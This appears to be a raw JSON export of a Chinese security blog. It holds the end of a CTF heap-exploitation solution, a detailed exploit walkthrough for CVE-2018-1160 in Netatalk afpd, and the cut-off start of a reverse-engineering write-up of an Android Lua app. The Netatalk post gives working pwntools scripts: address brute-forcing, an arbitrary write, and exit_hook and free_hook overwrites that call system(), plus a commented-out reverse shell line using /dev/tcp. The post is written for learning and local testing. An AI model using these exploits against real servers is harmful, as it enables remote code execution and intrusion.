libc.sym['_IO_2_1_stdout_']\n\ndelete(7)\nadd(0x90,'0')\ndelete(8)\nadd(0x80,'1')\nadd(0x80,p64(0) + p64(0xa1) + p64(stdout))\nadd(0x90,'3')\nadd(0x90, p64(0xfbad1800) + p64(0) * 3 + p64(environ) + p64(environ + 8) * 2)\nstack = l64() - 0x128\ninf(stack)\n\ndelete(3)\ndelete(2)\nadd(0x80,p64(0) + p64(0xa1) + p64(stack))\nadd(0x90,'b')\n\nopen_ = libc_base + libc.sym['open']\nread_ = libc_base + libc.sym['read']\nwrite_ = libc_base + libc.sym['write']\n# inf(open_);inf(read_);inf(write_)\npop_rdi = libc_base + 0x0000000000023b6a\npop_rsi = libc_base + 0x000000000002601f\npop_rdx = libc_base + 0x0000000000142c92\nflag = stack\naddr = stack + 0x100\n\npayload = b'./flag\\x00\\x00'\npayload += p64(pop_rdi) + p64(flag) + p64(pop_rsi) + p64(0) +p64(open_) \\\n + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(addr) +p64(pop_rdx) + p64(0x30) + p64(read_) \\\n + p64(pop_rdi) + p64(1) + p64(write_)\n\nadd(0x90,payload)\n\n# gdb.attach(io,'b *$rebase(0x004080)')\nia()\n```\n\n","tags":["CTF","wp"],"categories":["PWN"]},{"title":"关于NETATALK的一个老BUG","url":"/2022/01/07/CVE-2018-1160/","content":"\n# 0x00 前言\n\n今天看到一个很经典的cve，顺便写一篇博客\n漏洞是利用memcpy长度没限制导致的越界写，可覆盖关键变量，导致有一次任意地址写\n\n原文：[Exploiting an 18 Year Old Bug](https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172)\n\n源码：[Netatalk3.1.11](https://sourceforge.net/projects/netatalk/files/netatalk/3.1.11)\n\n# 0x01 源码\n\n为了调试方便直接下载好二进制、配置文件、运行库，这样就无需自己编译和安装依赖性\n我的本地是Ubuntu18.04，配置文件：\n\n```tex\n[Global]\nafp port = 5566\ndisconnect time = 0\nmax connections = 1000\nsleep time = 0\n```\n\n`Netatalk`是AppleTalk的开源实现方案，可以用作文件服务器来实现文件共享，afpd是其中的一个组件，类似于httpd的拿来做通信的部分，源码目录的`./etc/afpd`子目录为相关源码树。\n\n看一些关键函数：\n**dsi_tcp_open()**\n\n该函数首先会调用fork()函数建立新的子进程，并在子进程中执行如下逻辑：先从TCP会话中读取DSI header到结构体dsi->header，之后读取DSI payload内容放在dsi->commands指向的buf中。\n\n```c\nstatic pid_t dsi_tcp_open(DSI *dsi)\n{\n    pid_t pid;\n    SOCKLEN_T len;\n\n    len = sizeof(dsi->client);\n    dsi->socket = accept(dsi->serversock, (struct sockaddr *) &dsi->client, &len);\n\n    ......\n\n    if (dsi->socket < 0)\n        return -1;\n\n    getitimer(ITIMER_PROF, &itimer);\n    /* 建立子进程 */\n    if (0 == (pid = fork()) ) { /* child */\n        static struct itimerval timer = { {0, 0}, {DSI_TCPTIMEOUT, 0}};\n        struct sigaction newact, oldact;\n        uint8_t block[DSI_BLOCKSIZ];\n        size_t stored;\n    \n    ......\n\n        dsi_init_buffer(dsi);\n\n        /* read in commands. this is similar to dsi_receive except\n         * for the fact that we do some sanity checking to prevent\n         * delinquent connections from causing mischief. */\n\n        /* 先读两个字节 */\n        len = dsi_stream_read(dsi, block, 2);\n        if (!len ) {\n            /* connection already closed, don't log it (normal OSX 10.3 behaviour) */\n            exit(EXITERR_CLOSED);\n        }\n        if (len < 2 || (block[0] > DSIFL_MAX) || (block[1] > DSIFUNC_MAX)) {\n            LOG(log_error, logtype_dsi, \"dsi_tcp_open: invalid header\");\n            exit(EXITERR_CLNT);\n        }\n\n        /* 读取DSI header剩下内容 */\n        stored = 2;\n        while (stored < DSI_BLOCKSIZ) {\n            len = dsi_stream_read(dsi, block + stored, sizeof(block) - stored);\n            if (len > 0)\n                stored += len;\n            else {\n                LOG(log_error, logtype_dsi, \"dsi_tcp_open: stream_read: %s\", strerror(errno));\n                exit(EXITERR_CLNT);\n            }\n        }\n\n        /* 将DSI header的内容依次赋值给dsi-header结构体 */\n        dsi->header.dsi_flags = block[0];\n        dsi->header.dsi_command = block[1];\n        memcpy(&dsi->header.dsi_requestID, block + 2,\n               sizeof(dsi->header.dsi_requestID));\n        memcpy(&dsi->header.dsi_data.dsi_code, block + 4, sizeof(dsi->header.dsi_data.dsi_code));\n        memcpy(&dsi->header.dsi_len, block + 8, sizeof(dsi->header.dsi_len));\n        memcpy(&dsi->header.dsi_reserved, block + 12,\n               sizeof(dsi->header.dsi_reserved));\n        dsi->clientID = ntohs(dsi->header.dsi_requestID);\n\n        /* make sure we don't over-write our buffers. */\n        dsi->cmdlen = min(ntohl(dsi->header.dsi_len), dsi->server_quantum);\n\n        /* 读取payload内容到commands指针指向的buf中 */\n        stored = 0;\n        while (stored < dsi->cmdlen) {\n            len = dsi_stream_read(dsi, dsi->commands + stored, dsi->cmdlen - stored);\n            if (len > 0)\n                stored += len;\n            else {\n                LOG(log_error, logtype_dsi, \"dsi_tcp_open: stream_read: %s\", strerror(errno));\n                exit(EXITERR_CLNT);\n            }\n        }\n\n    ......\n\n    /* send back our pid */\n    return pid;\n}\n\n```\n\n**dsi_getsession()**\n\n该函数开启一个DSI会话，从TCP socket接收会话消息，保存至结构体DSI中。 函数首先调用dsi->proto_open(dsi)进行TCP消息的接收和处理，该函数实体为dsi_tcp_open()。根据返回值是父进程还是子进程，进入不同的处理逻辑。父进程则直接返回，继续监听，子进程则进入之后的DSI消息处理逻辑，根据dsi_command的值，选择不同的处理方式，若dsi_command为DSIFUNC_OPEN，则调用dsi_opensession()函数，初始化DSI会话。\n\n```c\nint dsi_getsession(DSI *dsi, server_child_t *serv_children, int tickleval, afp_child_t **childp)\n{\n  ......\n\n  switch (pid = dsi->proto_open(dsi)) { /* in libatalk/dsi/dsi_tcp.c */\n  case -1:\n    /* if we fail, just return. it might work later */\n    LOG(log_error, logtype_dsi, \"dsi_getsess: %s\", strerror(errno));\n    return -1;\n\n  case 0: /* child. mostly handled below. */\n    break;\n\n  default: /* parent */\n    /* using SIGKILL is hokey, but the child might not have\n     * re-established its signal handler for SIGTERM yet. */\n\n    ......\n\n    dsi->proto_close(dsi);\n    *childp = child;\n    return 0;\n  }\n  \n  ......\n\n  switch (dsi->header.dsi_command) {\n  case DSIFUNC_STAT: /* send off status and return */\n    ......\n    \n  case DSIFUNC_OPEN: /* setup session */\n    /* set up the tickle timer */\n    dsi->timer.it_interval.tv_sec = dsi->timer.it_value.tv_sec = tickleval;\n    dsi->timer.it_interval.tv_usec = dsi->timer.it_value.tv_usec = 0;\n    dsi_opensession(dsi);\n    *childp = NULL;\n    return 0;\n\n  default: /* just close */\n    LOG(log_info, logtype_dsi, \"DSIUnknown %d\", dsi->header.dsi_command);\n    dsi->proto_close(dsi);\n    exit(EXITERR_CLNT);\n  }\n}\n```\n\n**dsi_opensession()**\n\n函数首先根据commands[0]的内容决定处理逻辑，若为DSIOPT_ATTNQUANT，则执行memcpy，以commands[1]为大小，将commands[2]之后的内容拷贝至DSI结构体的attn_quantum成员变量（4 bytes）。之后程序会构建新的DSI消息到dsi->commands中，将server_quantum的值返回给客户端。\n\n```c\nvoid dsi_opensession(DSI *dsi)\n{\n  uint32_t i = 0; /* this serves double duty. it must be 4-bytes long */\n  int offs;\n\n    ......\n\n  /* parse options */\n  while (i < dsi->cmdlen) {\n    switch (dsi->commands[i++]) {\n    case DSIOPT_ATTNQUANT:\n      memcpy(&dsi->attn_quantum, dsi->commands + i + 1, dsi->commands[i]);\n      dsi->attn_quantum = ntohl(dsi->attn_quantum);\n\n    case DSIOPT_SERVQUANT: /* just ignore these */\n    default:\n      i += dsi->commands[i] + 1; /* forward past length tag + length */\n      break;\n    }\n  }\n\n  /* let the client know the server quantum. we don't use the\n   * max server quantum due to a bug in appleshare client 3.8.6. */\n  dsi->header.dsi_flags = DSIFL_REPLY;\n  dsi->header.dsi_data.dsi_code = 0;\n  /* dsi->header.dsi_command = DSIFUNC_OPEN;*/\n\n  dsi->cmdlen = 2 * (2 + sizeof(i)); /* length of data. dsi_send uses it. */\n\n  /* DSI Option Server Request Quantum */\n  dsi->commands[0] = DSIOPT_SERVQUANT;\n  dsi->commands[1] = sizeof(i);\n  i = htonl(( dsi->server_quantum < DSI_SERVQUANT_MIN || \n\t      dsi->server_quantum > DSI_SERVQUANT_MAX ) ? \n\t    DSI_SERVQUANT_DEF : dsi->server_quantum);\n  memcpy(dsi->commands + 2, &i, sizeof(i));\n\n  /* AFP replaycache size option */\n  offs = 2 + sizeof(i);\n  dsi->commands[offs] = DSIOPT_REPLCSIZE;\n  dsi->commands[offs+1] = sizeof(i);\n  i = htonl(REPLAYCACHE_SIZE);\n  memcpy(dsi->commands + offs + 2, &i, sizeof(i));\n  dsi_send(dsi);\n}\n```\n\n漏洞点也就在这个函数内，\n\n```c\nwhile (i < dsi->cmdlen) {\n    switch (dsi->commands[i++]) {\n    case DSIOPT_ATTNQUANT:  // #define DSIOPT_ATTNQUANT 0x01    \n      memcpy(&dsi->attn_quantum, dsi->commands + i + 1, dsi->commands[i]);\n      dsi->attn_quantum = ntohl(dsi->attn_quantum);\n```\n\nmemcpy的长度参数 dsi->commands[i] 由外部传入，且没检查大小，导致可溢出到DSI结构体中attn_quantum的后续成员。\n\n```c\n#define DSI_DATASIZ       65536\n\ntypedef struct DSI {\n    ...\n    uint32_t attn_quantum, datasize, server_quantum;\n    uint16_t serverID, clientID;\n    uint8_t  *commands; /* DSI recieve buffer */\n    uint8_t  data[DSI_DATASIZ];    /* DSI reply buffer */\n```\n\n但可见成员 commands 的类型为uint8_t*，所以memcpy的最大长度是0xff。并且由于 DSI_DATASIZ 为65535，所以溢出部分data后就无法向后溢出了，故最终只能溢出如上这些成员变量。\n\n利用之前先搞懂dsi是什么：[Data Stream Interface](https://en.wikipedia.org/wiki/Data_Stream_Interface)，按照协议格式可以构造其各个字段\n\n```c\ncommands = \"\\x01\"   // DSIOPT_ATTNQUANT 选项的值\ncommands += \"\\x80\"  // 数据长度\ncommands += \"\\xaa\" * 0x80\n```\n\n于是明白之后，我们可以交互试一下，构造一个dsi数据包，并给发送给目标的tcp端口(本地测试)，看看能否返回server_quantum的值。\n\n```python\nfrom pwn import *\ncontext(endian='big',log_level='debug')\nio = remote(\"127.0.0.1\",5566)\ncmd  = b'\\x01'+ p8(0xc)+ b'a'*8 + b'bbbb'\ndsi  = b'\\x00\\x04\\x00\\x01' #header部分的字段意义见原文\ndsi += p32(0)\ndsi += p32(len(cmd)) \ndsi += p32(0)\ndsi += cmd\nio.send(dsi)\nio.recv()\n```\n\n![image-20220107153501796](https://s2.loli.net/2022/01/07/kUTm9jVOvxAr6Io.png)\n\n测试确实可以收到bbbb\n\n![image-20220107155401775](https://s2.loli.net/2022/01/07/nRK9jcgTPFz1Ndi.png)\n\n# 0x02 漏洞利用\n\n漏洞点1：\n\n接下来具体看一下内存情况，继续使用上面的脚本，启动gdb找到bbbb\n\n![image-20220107160010721](https://s2.loli.net/2022/01/07/xWvndjtp89eam7S.png)\n\n对应DSI的结构体，可以知道0x00007f5f3d6c8010即commands，再看一下内存布局\n\n![img](https://s2.loli.net/2022/01/07/jh4BRb89DFCzmMJ.png)\n\n该地址和libc地址比较相近，所以段基址都是4k页对齐，爆两个字节，最差65536次就可以了\n\n从低位开始，依次覆盖commands指针的各个字节。当修改后的commands指针是一个可写的地址时，dsi_opensession()函数可以将server_quantum的值放进来并返回给我们，否则，子进程会由于访问不可写的地址而崩溃，socket异常。故，可以通过观察服务器是否给我们返回来确定当前我们是否爆破出一个合法的地址。\n\n```python\ndef boom():\n    leak = b''\n    for j in range(8):\n        for i in range(256):\n            if(j>2 and j<6): i = 255 - i\n            io = remote(ip,port)\n            payload  = b'\\x01'+ p8(0x11+j)+ b'a'*0x10 + leak + p8(i)\n            io.send(create_dsi(payload))\n            try:\n                a = io.recv()\n                leak += p8(i)\n                log.success(str(hex(i)))\n                io.close()\n                break\n            except:\n                io.close()\n    return u64(leak)\n\nleak_addr = boom()\n```\n\n至于为什么3-6位从0xff到0x00爆是为了计算偏移时方便一点，结果更接近libc_base，且地址较高\n\n![image-20220107165016414](https://s2.loli.net/2022/01/07/bH52kwvjndYIe3p.png)\n\n![image-20220107165049214](https://s2.loli.net/2022/01/07/aUCnvpiJg2L6So4.png)\n\n在本地测试的方便之处在于可以很方便地找到libc基址，可是远程就没那么容易了，不知道机器版本的情况跨如何知道具体偏移呢，可以先在本地测试攻击方法，本地成功之后再远程爆破，直到远程成功为止\n\n```python\nleak_addr = 0x7f5f3d138000\nfor i in range(0x0000000,0xffff000,0x1000):\n    libc_addr = leak_addr - i \n```\n\n为了方便，本文只在本地进行测试，所以假设现在已经拥有了libc基址，可以控制commands，下一步利用任意写漏洞，\n\n漏洞点2：\n\n**dsi_stream_receive()**\n\n该函数从当前socket继续读取消息并保存在结构体中。具体地，先读取DSI header并保存到dsi->header结构体中，然后读取后续DSI payload保存到dsi->commands指向的buffer当中，长度由dsi->cmdlen指定。\n\n```c\nint dsi_stream_receive(DSI *dsi)\n{\n  char block[DSI_BLOCKSIZ];\n\n  LOG(log_maxdebug, logtype_dsi, \"dsi_stream_receive: START\");\n\n  if (dsi->flags & DSI_DISCONNECTED)\n      return 0;\n\n  /* read in the header */\n  if (dsi_buffered_stream_read(dsi, (uint8_t *)block, sizeof(block)) != sizeof(block)) \n    return 0;\n\n  dsi->header.dsi_flags = block[0];\n  dsi->header.dsi_command = block[1];\n\n  if (dsi->header.dsi_command == 0)\n      return 0;\n\n  memcpy(&dsi->header.dsi_requestID, block + 2, sizeof(dsi->header.dsi_requestID));\n  memcpy(&dsi->header.dsi_data.dsi_doff, block + 4, sizeof(dsi->header.dsi_data.dsi_doff));\n  dsi->header.dsi_data.dsi_doff = htonl(dsi->header.dsi_data.dsi_doff);\n  memcpy(&dsi->header.dsi_len, block + 8, sizeof(dsi->header.dsi_len));\n\n  memcpy(&dsi->header.dsi_reserved, block + 12, sizeof(dsi->header.dsi_reserved));\n  dsi->clientID = ntohs(dsi->header.dsi_requestID);\n  \n  /* make sure we don't over-write our buffers. */\n  dsi->cmdlen = MIN(ntohl(dsi->header.dsi_len), dsi->server_quantum);\n\n  /* Receiving DSIWrite data is done in AFP function, not here */\n  if (dsi->header.dsi_data.dsi_doff) {\n      LOG(log_maxdebug, logtype_dsi, \"dsi_stream_receive: write request\");\n      dsi->cmdlen = dsi->header.dsi_data.dsi_doff;\n  }\n\n  /* 将header之后的payload读取到commands指向的内存中 */\n  if (dsi_stream_read(dsi, dsi->commands, dsi->cmdlen) != dsi->cmdlen)\n    return 0;\n\n  LOG(log_debug, logtype_dsi, \"dsi_stream_receive: DSI cmdlen: %zd\", dsi->cmdlen);\n\n  return block[1];\n}\n```\n\n谈一下后续流程，commands通过一个定义在etc/afpd/switch.c名叫`afp_switch`的全局跳转表指针（指向具有255个项的跳转表）来在系统中传递。跳转表中每一个项要么是NULL（表示没有实现），要么是一个函数（用于处理`commands`里的AFP数据）。\n\n读取完毕后若`cmd=2(DSIFUNC_CMD)`，则以`dsi->commands[0]`为索引，`err = (*afp_switch[function])(obj,(char *)dsi->commands, dsi->cmdlen,(char *)&dsi->data, &dsi->datalen);`，调用afp_switch函数表的指针。\n\n```c\nfunction = (u_char) dsi->commands[0];\nif (afp_switch[function]) {\n    err = (*afp_switch[function])(obj,\n            (char *)dsi->commands, dsi->cmdlen,\n            (char *)&dsi->data, &dsi->datalen);\n} else {\n    LOG(log_maxdebug, logtype_afpd, \"bad function %X\", function);\n    dsi->datalen = 0;\n    err = AFPERR_NOOP;\n}\n```\n\n`afp_switch`指向两种跳转表中的一个。一个名叫`preauth_switch`，它包含了未认证用户仅能调用的四个函数，`preauth_switch`也是默认的`afp_switch`表。另一个名叫`postauth_switch`，当用户进行认证后，它被换入到`afp_switch`中。\n\n这里的结构是这样的\n\n```c\nAFPCmd *afp_switch = preauth_switch;\n\nAFPCmd postauth_switch[] = {\n    NULL, afp_bytelock, afp_closevol, afp_closedir,\n    afp_closefork, afp_copyfile, afp_createdir, afp_createfile,\t/*   0 -   7 */\n    afp_delete, afp_enumerate, afp_flush, afp_flushfork,\n    afp_null, afp_null, afp_getforkparams, afp_getsrvrinfo,\t/*   8 -  15 */\n    afp_getsrvrparms, afp_getvolparams, afp_login, afp_logincont,\n    afp_logout, afp_mapid, afp_mapname, afp_moveandrename,\t/*  16 -  23 */\n    afp_openvol, afp_opendir, afp_openfork, afp_read,\n    afp_rename, afp_setdirparams, afp_setfilparams, afp_setforkparams,\n    /*  24 -  31 */\n    afp_setvolparams, afp_write, afp_getfildirparams, afp_setfildirparams,\n    afp_changepw, afp_getuserinfo, afp_getsrvrmesg, afp_createid, /*  32 -  39 */\n    afp_deleteid, afp_resolveid, afp_exchangefiles, afp_catsearch,\n    afp_null, afp_null, afp_null, afp_null,\t\t\t/*  40 -  47 */\n    afp_opendt, afp_closedt, afp_null, afp_geticon,\n    afp_geticoninfo, afp_addappl, afp_rmvappl, afp_getappl,\t/*  48 -  55 */\n    afp_addcomment, afp_rmvcomment, afp_getcomment, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/*  56 -  63 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/*  64 -  71 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, afp_syncdir, afp_syncfork,\t/*  72 -  79 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/*  80 -  87 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/*  88 -  95 */\n    NULL, NULL, NULL, NULL,\n    afp_getdiracl, afp_setdiracl, afp_afschangepw, NULL,\t/*  96 - 103 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 104 - 111 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 112 - 119 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 120 - 127 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 128 - 135 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 136 - 143 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 144 - 151 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 152 - 159 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 160 - 167 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 168 - 175 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 176 - 183 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 184 - 191 */\n    afp_addicon, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 192 - 199 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 200 - 207 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 208 - 215 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 216 - 223 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 224 - 231 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 232 - 239 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 240 - 247 */\n    NULL, NULL, NULL, NULL,\n    NULL, NULL, NULL, NULL,\t\t\t\t\t/* 248 - 255 */\n};\n```\n\n有了dsi_stream_receive()，我们就可以先通过memcpy覆写dsi->commands指针，再通过`dsi_stream_read`实现任意地址写。\n\n```python\nfrom pwn import *\ncontext(endian='little')\n\nip = \"127.0.0.1\"\nport = 5566\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n\ndef create_dsi(data):\n    dsi  = b'\\x00\\x04\\x00\\x01'\n    dsi += p32(0)\n    dsi += p32(len(data),endian='big')\n    dsi += p32(0)\n    dsi += data\n    return dsi\n\ndef send2(io,addr,data):\n    payload  = b'\\x01'+ p8(0x18)+ b'a'*0x10 + p64(addr)\n    io.send(create_dsi(payload))\n    io.recv()\n    io.send(create_dsi(data))\n    \nleak_addr = 0x7f5f3d138000\n# 0x7f5f3d138000 - 0x817000\nraw_input()\nlog.success(hex(leak_addr))\nio = remote(ip,port)\nsend2(io,leak_addr,\"deadbeef\")\n```\n\n查看内存，目标地址已被成功修改\n\n![image-20220107171022664](https://s2.loli.net/2022/01/07/HIhOEQa7ovAKfBe.png)\n\n漏洞点3：\n\n有了前两个条件，最后一步就可以进行精准打击了，free_hook可以的，之前hitcon2019用的方法就是freehook，这里用一种新学的方法，世人称之为exit_hook\n\n这里简单记录一下原理，写个exit()的程序，跟进会知道它的具体流程\n\n![image-20220107174429000](https://s2.loli.net/2022/01/07/lNHKwUvLImrxWkT.png)\n\n![image-20220107174612941](https://s2.loli.net/2022/01/07/ly3ITJw9mXcpiOr.png)\n\n这里的<_dl_fini+105>是rtld_lock_default_lock_recursive函数，rdi是\\_rtld_gobal+2312\n\n看一下源码\n\n```c\n#ifdef SHARED\n   int do_audit = 0;\n  again:\n #endif\n   for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns)\n     {\n       /* Protect against concurrent loads and unloads.  */\n       __rtld_lock_lock_recursive (GL(dl_load_lock));\n \n       unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;\n       /* No need to do anything for empty namespaces or those used for\n      auditing DSOs.  */\n       if (nloaded == 0\n #ifdef SHARED\n       || GL(dl_ns)[ns]._ns_loaded->l_auditing != do_audit\n #endif\n       )\n     __rtld_lock_unlock_recursive (GL(dl_load_lock));\n```\n\n![image-20220107183237588](https://s2.loli.net/2022/01/07/8o3jHzeifsOq4S6.png)\n\n调用了两个关键的函数，如上，这两个函数在_rtld_global结构体里面，也就是说如果我们能改写这两个函数其中一个就能控制流劫持并控制参数\n\n函数指针：\\_dl_rtld_lock_recursive (_rtld_global+3840)\n\n调用参数：\\_dl_load_lock (_rtld_global+2312)\n\n![image-20220107183731986](https://s2.loli.net/2022/01/07/CiS6FrvEe2DWUgt.png)\n\n所以只要有一次任意地址写大小0x600字节就可以\n\n```python\nfrom pwn import *\ncontext(endian='little')\n\nip = \"127.0.0.1\"\nport = 5566\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n\ndef create_dsi(data):\n    dsi  = b'\\x00\\x04\\x00\\x01'\n    dsi += p32(0)\n    dsi += p32(len(data),endian='big')\n    dsi += p32(0)\n    dsi += data\n    return dsi\n\ndef send2(io,addr,data):\n    payload  = b'\\x01'+ p8(0x18)+ b'a'*0x10 + p64(addr)\n    io.send(create_dsi(payload))\n    io.recv()\n    io.send(create_dsi(data))\n\nleak_addr = 0x7f5f3c921000\n# 0x7f5f3d138000 - 0x817000\nlog.success(hex(leak_addr))\nraw_input()\nlibc.address = leak_addr\nrtld = libc.address + 0xed4060\n#cmd = b'bash -c \"bash  -i>& /dev/tcp/ip/port 0<&1\"'\ncmd = \"cat /home/ld1ng/Desktop/netatalk/flag.txt\"\n# cmd = \"/bin/zsh\"\nio = remote(ip,port)\nsend2(io,rtld+2312,cmd.ljust(0x5f8,b'\\x00')+p64(libc.symbols['system']))\n```\n\n改写后cmd成为system函数的参数，当程序exit后即可拿到shell\n\n![image-20220107184859828](https://s2.loli.net/2022/01/07/RBxltWq8dzsPkvf.png)\n\n![image-20230517215417789](https://files.catbox.moe/sgzy8i.png)\n\n\n\n------\n\n最后说一下free_hook的方法，hitcon2019官方的解法，布局比较复杂，用到了两个gadget\n\n覆写`__free_hook`为`__libc_dlopen_mode+56`\n\n![image-20220108141300714](https://s2.loli.net/2022/01/08/SYh5a7O3oFMNnIP.png)\n\n覆写`_dl_open_hook`为`_dl_open_hook+8`，`_dl_open_hook+8`为`fgetpos64+207`的这个magic_gadget\n\n![image-20220108141653927](https://s2.loli.net/2022/01/08/ltYjxMVzS8Q3FHG.png)\n\n`mov rdi,rax ; call QWORD PTR [rax+0x20]`，此时因为rdi指向dl_open_hook+8。我们可以将dl_open_hook+0x20处修改为setcontext+53，从而实现任意函数执行。\n\n在dl_open_hook后面布置sigFrame，最终触发err时的free，调用system(cmd)执行反弹shell\n\n借用大佬的布局图：\n\n![](https://gtrboy.github.io/img/netatalk/layout.png)\n\npayload如下：\n\n```python\nsigframe = SigreturnFrame()\nsigframe.rip = system_addr\nsigframe.rdi = free_hook + 8                   # cmd\nsigframe.rsp = free_hook                       # must be a writable address, as the stack of system func\n\npayload = b''.ljust(0xF, b'\\x00')              # padding\npayload += p64(libc_dlopen_mode_56)            # __free_hook, after this rop, rax = *dl_open_hook = dl_open_hook + 8\npayload += cmd.ljust(0x2bb8, b'\\x00')          # __free_hook + 8\npayload += p64(dl_open_hook + 8)               # dl_open_hook, *dl_open_hook = dl_open_hook+8, **dl_open_hook = fgetpos64+207\npayload += p64(fgetpos64_207)                # _dl_open_hook+8, let rdi = rax = _dl_open_hook + 8\npayload += b'A' * 0x18\npayload += p64(setcontext_53)             # dl_open_hook + 0x28 = rax + 0x20, call [rax+0x20] = setcontext+53\npayload += bytes(sigframe)[0x28:]           # now rdi = dl_open_hook + 8, thus we cut the offset from rdi to this pos\n```\n\n\n\n# 0x03 小结\n\n转眼2022年了，水平还是太菜代码看的好累，据说这个CVE是原作者在飞机上三个小时发现的...膜拜，写完博客感觉还是有收获的\n","tags":["KNOWLEDGE","cve"],"categories":["LEARNING"]},{"title":"一份礼物.apk逆向分析","url":"/2021/03/20/一份礼物.apk/","content":"\n# 0x00 前言\n\n起因是这款手机app曾有一段时间风席卷高校，也看到很多同学的“社死”现场\n\n![image-20210330190340454](https://i.loli.net/2021/03/30/edfwyVsqjOzNpJ8.png)\n\n# 0x01 apk分析\n\n首先apktool解包，在assets文件夹下\n\n![image-20210326232139705](https://i.loli.net/2021/03/26/OovItwByqYPdb8l.png)\n\n发现了mc.mp3，就是O泡的广告音频，还有一些.lua文件，打开之后发现是加密的，不了解lua，但是很有可能是就是lua写的，这种脚本语言很可能需要被加载\n\n分析java部分，jeb打开一份礼物.apk，为了方便可以修改AndroidManifest.xml中的`application`标签，加一个`android:debuggable=\"true\"`，这样重新用apktool编译回去就可以动态调试了，\n\n但是这样的apk并不能直接安装，需要对其重打包并进行签名。\n\n```python\n#管理员\nkeytool -genkey -alias key.keystore -keyalg RSA -validity 30000 -keystore key.keystore\n\njarsigner -verbose -keystore key.keystore -signedjar 123.apk 123.apk key.keystore\n```\n\n签完名正常安装，改一下开发者选项\n\n![image-20210326233338463](https://i.loli.net/2021/03/26/SZhRvQpdXfkiJ1y.png)\n\n界面变为如下效果：\n\n![image-20210326233445700](https://i.loli.net/2021/03/26/RafnHcTD19jAMmJ.png)\n\n找到启动类，跟进到这里\n\n![image-20210329223248785](https://i.loli.net/2021/03/29/Fvy3iLjU5DqSbVp.png)\n\njava水平实在有限，逻辑搞不清楚，多次下断点都没命中\n\n但发现有加载lua的代码，\n\n![image-20210330163439453](https://i.loli.net/2021/03/30/uznI2yXUFhl6ir9.png)\n\n\n\n尝试抓包，发现这个程序并没有任何的网络封包传输 (fiddler)\n\n![image-20210330160100632](https://i.loli.net/2021/03/30/chdFxZ5DvjKAJy2.png)\n\n在jeb下，发现了大量的混淆包，还有一些百度API、腾讯API没被调用，甚至还有网上可以搜到Lua源项目的包，使用Androlua的库，可见该app是魔改过的\n\n![img](https://i.loli.net/2021/03/26/uKbf1ZdSHYyLavB.png)\n\n后来网上查到了Lua的Android项目，是国人开发的一个 lua 写安卓应用的框架\n\nJava部分可能并不是应用的主体部分，重要操作可能会写在Lua中，\n\n上图相关代码实际上并没有被调用，只是打包apk时封装进去的类，关键逻辑位于main.lua中。\n\nlua脚本需要加载，而在加载之前肯定是要先解密的，所以只要找到解密函数就可以了\n\nlibluajava.so文件会使用`luaL_loadbuffer`或者`luaL_loadbufferx`函数对Lua脚本进行加载，通常解密也在这个位置，果不其然IDA定位到这个函数\n\n```c\nint __fastcall luaL_loadbufferx(int a1, int array, size_t size, int path, int a5)\n{\n  int v5; // r10\n  size_t v6; // r6\n  int v7; // r11\n  int v8; // r8\n  _BYTE *v9; // r0\n  int v10; // r1\n  signed int v11; // r2\n  _BYTE *v13; // [sp+8h] [bp-28h]\n  size_t v14; // [sp+Ch] [bp-24h]\n\n  v5 = a1;\n  v6 = size;\n  v7 = array;\n  v8 = path;\n  v13 = array;\n  v14 = size;\n  if ( *array == 0x1B && *(array + 1) != 0x4C )\n  {\n    v9 = malloc(size);\n    if ( v6 )\n    {\n      *v9 = 27;\n      if ( v6 != 1 )\n      {\n        v10 = 0;\n        v11 = 1;\n        do\n        {\n          v10 += v6;\n          v9[v11] = *(v7 + v11) ^ (v10\n                                 + ((((-2139062143LL * v10) >> 32) + v10) >> 7)\n                                 + ((((-2139062143LL * v10) >> 32) + v10) < 0));\n          ++v11;\n        }\n        while ( v6 != v11 );\n      }\n    }\n    v13 = v9;\n  }\n  return j_lua_load(v5, sub_E0B6, &v13, v8, 